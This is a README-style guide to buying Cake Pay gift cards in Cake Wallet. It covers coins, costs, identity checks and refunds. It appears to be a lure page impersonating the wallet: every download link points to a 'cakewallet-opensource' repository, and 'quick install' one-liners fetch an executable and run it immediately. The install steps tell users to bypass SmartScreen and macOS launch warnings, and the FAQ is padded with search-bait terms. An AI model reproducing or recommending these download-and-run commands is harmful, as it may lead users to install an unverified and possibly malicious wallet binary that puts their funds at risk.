![Cake Wallet cake pay gift card guide](assets/cake-wallet-cake-pay-gift-card-article-banner.png)

# Buy a Cake Pay Gift Card in Cake Wallet

Which coins are accepted, what the card costs, and who checks your identity.

## Downloads - v6.4.5

<p align="center"><a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`cake-wallet-desktop-v6.4.5-windows.exe`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`cake-wallet-desktop-v6.4.5-macos.dmg`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`cake-wallet-desktop-v6.4.5-linux.xz`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz) |

Every file on this page comes from the [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest).

> Cake Wallet never asks for your recovery phrase, and no support channel needs it.

Open Cake Pay in the app, choose a gift card or prepaid card, pick the amount and pay with a supported coin. Cards are sold at face value, so a twenty-dollar card costs twenty dollars plus the network fee. Bitcoin, Lightning, Zcash, Litecoin, USDC and USDT are taken directly; other coins route through an integration.

<!-- ARTICLE-BODY-BEGIN -->

## What Cake Pay is
It is a way to spend crypto at merchants that do not accept it, by buying a card that does. The catalogue and the checkout sit inside the wallet, and the card is issued by the merchant or issuer behind that listing rather than by Cake Wallet.

That split decides who answers for a card that does not work at a till: the issuer, not the wallet. Keep the order confirmation, which is the reference any support route will ask for.

## Which coins are accepted
Bitcoin, Lightning, Zcash, Litecoin including MWEB, USDC and USDT are accepted directly. Other coins are converted through an integration behind the checkout, which adds a step and its own rate.

<a href="https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-supported-coins-networks.md">Supported coins and networks</a> covers the full coin set, so you can see whether the coin you hold is taken directly or needs a swap first.

## What a card costs
How much you pay is the card's face value plus the cost of paying for it: a twenty-dollar card costs twenty dollars. On top of that you pay the network fee for the coin you spend, and any provider fee hidden inside a conversion if your coin is routed through one.

That is why paying with Lightning or a low-fee chain is cheaper in practice than paying with an on-chain transaction at a busy moment. The card value does not change; the cost of paying for it does.

## Getting crypto to spend
If you hold nothing yet, buying through a provider is the route in, and it comes with the provider's identity checks. Swapping from a coin you already hold avoids that step entirely.

<a href="https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-buy-monero.md">Buy Monero with Cake Wallet</a> explains the provider model, and why a card purchase is the part of any crypto flow that carries a paper trail.

## Identity checks
Some cards need identity verification at redemption, usually because the issuer is regulated in the country where the card is spent. Which cards those are is set by the issuer and changes by region, so no fixed list is published here.

The wallet's own KYC position is separate: holding and sending needs no identity. Cake Wallet KYC and anonymity covers that split, including why a merchant card can still ask who you are.

## Failed orders and refunds
A failed order usually means the payment did not arrive in time, the amount fell outside the card's range, or the listing is unavailable in your region. Retry with a different card or amount before assuming the flow is broken.

Refund behaviour is not documented in the material this guide is built from, so nothing is promised here. If a card never arrives, the order reference is what you take to the issuer.

## Use the current release
Cake Pay depends on the build and on the provider integrations your build ships with. Install the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest">current Cake Wallet release</a> before concluding that a card or a coin is unsupported.

The desktop build published here is older than parts of the current Cake Pay work, so check the release notes for the feature before you rely on it there.

## FAQ
### Is Cake Pay legit?
It is a product of the same company as the wallet, and the cards are issued by third parties. Judge it as a purchase: keep the order reference.
### Can I add a Cake Pay card to Apple Pay?
Some prepaid cards can be added to a mobile wallet if the issuer supports it. That is an issuer feature, not a wallet one.
### Which cards require ID at redemption?
The issuer decides per card and per country. The listing states it before you pay where the requirement applies.
### Is Cake Pay a bakery or a token?
Neither. Searches for bundt-cake pay or CAKE-token dividends are about unrelated businesses and a different asset; this page covers the gift-card and prepaid-card product inside the wallet.

<!-- ARTICLE-BODY-END -->

## How to install Cake Wallet

<!-- INSTALL-BEGIN -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe">cake-wallet-desktop-v6.4.5-windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg">cake-wallet-desktop-v6.4.5-macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz">cake-wallet-desktop-v6.4.5-linux.xz</a> or the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.flatpak">cake-wallet-desktop-v6.4.5-linux.flatpak</a>.
2. Archive: extract it and run the executable inside the extracted folder.
3. Flatpak: run `flatpak install ./cake-wallet-desktop-v6.4.5-linux.flatpak` where you saved it.
4. Launch Cake Wallet and restore your wallet.
<!-- INSTALL-END -->

## Related guides
[Cake Wallet KYC and anonymity](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-kyc-anonymous.md) · [buy Monero with Cake Wallet](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-buy-monero.md) · [supported coins and networks](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-supported-coins-networks.md) · [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest)
